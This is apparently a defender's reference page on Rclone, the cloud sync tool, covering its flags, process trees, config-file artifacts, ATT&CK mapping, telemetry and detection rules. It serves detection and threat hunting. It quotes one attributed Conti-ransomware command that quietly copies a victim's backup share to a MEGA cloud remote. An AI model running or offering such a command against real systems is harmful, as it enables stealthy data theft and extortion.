# Rclone

## Table of Contents

- [Rclone](#rclone)
  - [Table of Contents](#table-of-contents)
  - [Acknowledgement(s)](#acknowledgements)
  - [Description](#description)
  - [Versions History](#versions-history)
  - [File Metadata](#file-metadata)
  - [Common CommandLine](#common-commandline)
  - [Threat Actor Ops (TAOps)](#threat-actor-ops-taops)
  - [Common Process Trees](#common-process-trees)
  - [Default Install Location](#default-install-location)
  - [DFIR Artifacts](#dfir-artifacts)
  - [Examples In The Wild](#examples-in-the-wild)
  - [Documentation](#documentation)
  - [Blogs / Reports References](#blogs--reports-references)
  - [ATT&CK Techniques](#attck-techniques)
  - [Telemetry](#telemetry)
  - [Detection Validation](#detection-validation)
  - [Detection Rules](#detection-rules)
  - [LOLBAS / GTFOBins References](#lolbas--gtfobins-references)

## Acknowledgement(s)

- 3CORESec - [@3CORESec](https://twitter.com/3CORESec)
- Nasreddine Bencherchali - [@nas_bench](https://twitter.com/nas_bench)

## Description

> **Rclone is a command line program to manage files on cloud storage, has powerful cloud equivalents to the unix commands rsync, cp, mv, mount, ls, ncdu, tree, rm, and cat** — [Rclone](https://rclone.org/)

## Versions History

| Version | SHA1                                     | VT                                                                                                                   |
|---------|------------------------------------------|----------------------------------------------------------------------------------------------------------------------|
| 1.57.0 (x64)    | fdb92fac37232790839163a3cae5f37372db7235 | [LINK](https://www.virustotal.com/gui/file/0112e3b20872760dda5f658f6b546c85f126e803e27f0577b294f335ffa5a298)                                                                                                             |

## File Metadata

| Attribute     | Value |
|---------------|-------|
| Copyright     | The Rclone Authors     |
| Product       | Rclone     |
| Description   | Rsync for cloud storage     |
| Original Name | rclone.exe     |
| Internal Name | rclone     |

## Common CommandLine

- Rclone is most often renamed by threat actors so its better to focus on the arguments as those are less likely to change

```batch
rclone config

rclone config create [ConfName] [CloudStorageProvider] user [User/Email] pass [Password]

rclone copy --max-age [Duration] "[\\Source]" [ConfigName]:[Destination]
```

- Below are some of the most common flags

```yaml
- -q, --quiet: Print as little stuff as possible
- --no-check-certificate: Do not verify the server SSL certificate (insecure)
- --auto-confirm: If enabled, do not request console confirmation
- --max-age: Only transfer files younger than this in s or suffix ms|s|m|h|d|w|M|y (default off)
- --bwlimit BwTimetable: Bandwidth limit in KiB/s, or use suffix B|K|M|G|T|P or a full timetable
- -P, --progress: Show progress during transfer
- --transfers: Number of file transfers to run in parallel (default 4)
- --ignore-existing: Skip all files that exist on destination
- --multi-thread-streams: Max number of streams to use for multi-thread downloads (default 4)
```

## Threat Actor Ops (TAOps)

- [Exfiltration of data via ``Rclone`` (Example 1)](https://www.advintel.io/post/backup-removal-solutions-from-conti-ransomware-with-love)

```powershell
rclone.exe copy --max-age 2y "\\VEEAM.VICTIMORG.local\" mega:VEEAM -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M
```

## Common Process Trees

- Rclone launched from CMD or PowerShell

```yaml
.
└── cmd.exe
    └── rclone.exe

.
└── powershell.exe
    └── rclone.exe
```

## Default Install Location

- ``Rclone`` is a downloadable portable executable so no installation is required to execute it.

## DFIR Artifacts

- Using the default config creation command will create the file ``rclone.conf`` in the following location:

```batch
C:\Users\[Username]\AppData\Roaming\rclone\rclone.conf
```

## Examples In The Wild

- TBD

## Documentation

- [Rclone - Commands](https://rclone.org/commands/)
- [Rclone - Usage](https://rclone.org/docs/)
- [Rclone - Flags](https://rclone.org/flags/)

## Blogs / Reports References

- [Cybereason - THREAT ANALYSIS REPORT: From Shathak Emails to the Conti Ransomware](https://www.cybereason.com/blog/threat-analysis-report-from-shatak-emails-to-the-conti-ransomware)
- [Cybereason - Cybereason vs. Egregor Ransomware](https://www.cybereason.com/blog/cybereason-vs-egregor-ransomware)
- [The DFIR Report - BazarLoader and the Conti Leaks](https://thedfirreport.com/2021/10/04/bazarloader-and-the-conti-leaks/)
- [The DFIR Report - Sodinokibi (aka REvil) Ransomware](https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/)
- [The DFIR Report - CONTInuing the Bazar Ransomware Story](https://thedfirreport.com/2021/11/29/continuing-the-bazar-ransomware-story/)
- [Microsoft Security Blog - BazaCall: Phony call centers lead to exfiltration and ransomware](https://www.microsoft.com/security/blog/2021/07/29/bazacall-phony-call-centers-lead-to-exfiltration-and-ransomware/)
- [Mandiant - So Unchill: Melting UNC2198 ICEDID to Ransomware Operations](https://www.mandiant.com/resources/melting-unc2198-icedid-to-ransomware-operations)
- [Mandiant - Shining a Light on DARKSIDE Ransomware Operations](https://www.mandiant.com/resources/shining-a-light-on-darkside-ransomware-operations)
- [Mandiant - UNC2447 SOMBRAT and FIVEHANDS Ransomware: A Sophisticated Financial Threat](https://www.mandiant.com/resources/unc2447-sombrat-and-fivehands-ransomware-sophisticated-financial-threat)
- [Mandiant - Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents](https://www.mandiant.com/resources/tactics-techniques-procedures-associated-with-maze-ransomware-incidents)
- [ADVIntel - Backup “Removal” Solutions - From Conti Ransomware With Love](https://www.advintel.io/post/backup-removal-solutions-from-conti-ransomware-with-love)
- [ADVIntel - Hunting for Corporate Insurance Policies: Indicators of [Ransom] Exfiltration](https://www.advintel.io/post/hunting-for-corporate-insurance-policies-indicators-of-ransom-exfiltrations)
- [NCC Group - Detecting Rclone – An Effective Tool for Exfiltration](https://research.nccgroup.com/2021/05/27/detecting-rclone-an-effective-tool-for-exfiltration/)
- [Red Canary - Transferring leverage in a ransomware attack](https://redcanary.com/blog/rclone-mega-extortion/)

## ATT&CK Techniques

- [T1048 - Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048/)
- [T1567.002 - Exfiltration Over Web Service: Exfiltration to Cloud Storage](https://attack.mitre.org/techniques/T1567/002/)

## Telemetry

- [Security Event ID 4688 - A new process has been created](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4688)
- [Sysmon Event ID 1 - Process creation](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=90001)
- [PsSetCreateProcessNotifyRoutine/Ex](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreateprocessnotifyroutineex)
- [ETW - Microsoft-Windows-Kernel-Process - Event ID 1 - ProcessStart](https://github.com/nasbench/EVTX-ETW-Resources)
- [ETW - Microsoft-Windows-Kernel-File - Event ID 12 - Create](https://github.com/nasbench/EVTX-ETW-Resources)
- [Sysmon Event ID 11 - FileCreate](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=90011)

## Detection Validation

- TBD

## Detection Rules

- **Splunk**
  - [Detect Renamed RClone](https://research.splunk.com/endpoint/detect_renamed_rclone/)
  - [Detect RClone Command-Line Usage](https://research.splunk.com/endpoint/detect_rclone_command-line_usage/)

- **Microsoft 365 Defender**
  - [Bazacall Renamed Rclone for Exfiltration](https://github.com/microsoft/Microsoft-365-Defender-Hunting-Queries/blob/master/Campaigns/Bazacall/Renamed%20Rclone%20Exfil.md)

- **Sigma**
  - [Rclone Config File Creation](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/file_event/win_rclone_exec_file.yml)
  - [Rclone Execution via Command Line or PowerShell](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_susp_rclone_execution.yml)

- **Other**
  - [Vadim-Hunter - Sodinokibi (aka REvil) Ransomware](https://github.com/vadim-hunter/Detection-Ideas-Rules/blob/main/Threat%20Intelligence/The%20DFIR%20Report/20210329_Sodinokibi_(aka_REvil)_Ransomware.yaml)
  - [BeardOfBinary - Rclone Execution via Command Line or PowerShell](https://gist.github.com/beardofbinary/fede0607e830aa1add8deda3d59d9a77#file-rclone_execution-yaml)

## LOLBAS / GTFOBins References

- None
